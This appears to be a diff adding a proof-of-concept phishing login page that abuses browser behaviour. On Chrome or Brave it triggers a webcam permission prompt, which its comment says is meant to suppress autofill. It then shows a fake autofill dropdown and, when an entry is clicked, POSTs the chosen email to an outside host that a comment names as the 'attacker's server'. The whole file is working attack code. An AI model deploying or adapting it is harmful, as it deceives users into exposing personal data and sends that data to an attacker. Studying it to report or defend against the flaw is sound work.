@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 50px;
+      background: #f0f2f5;
+    }
+    .login-container {
+      background: white;
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      position: relative;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    .fake-autofill {
+      display: none;
+      position: absolute;
+      top: 100px;
+      left: 30px;
+      background: white;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      z-index: 9999;
+      width: calc(100% - 60px);
+    }
+    .fake-autofill div {
+      padding: 10px;
+      cursor: pointer;
+    }
+    .fake-autofill div:hover {
+      background: #f1f1f1;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Sign in</h2>
+    <input id="emailInput" type="email" placeholder="Email address" autocomplete="email" />
+    <div class="fake-autofill" id="fakeAutofill">
+      <div>yourrealemail@gmail.com</div>
+      <div>backup.mail@domain.com</div>
+    </div>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById("emailInput");
+    const fakeAutofill = document.getElementById("fakeAutofill");
+
+    function isChromeOrBrave() {
+      return /Chrome|Brave/.test(navigator.userAgent) && navigator.userAgent.includes("Safari");
+    }
+
+    emailInput.addEventListener("focus", () => {
+      if (!isChromeOrBrave()) return;
+
+      // 1. Trigger webcam permission prompt to suppress autofill
+      navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
+
+      // 2. After short delay, show fake dropdown
+      setTimeout(() => {
+        fakeAutofill.style.display = "block";
+      }, 800);
+    });
+
+    fakeAutofill.addEventListener("click", e => {
+      if (e.target.tagName === "DIV") {
+        const selectedEmail = e.target.innerText;
+        emailInput.value = selectedEmail;
+        fakeAutofill.style.display = "none";
+
+        // 3. Send to attacker's server (webhook)
+        fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: selectedEmail })
+        });
+      }
+    });
+  </script>
+</body>
+</html>
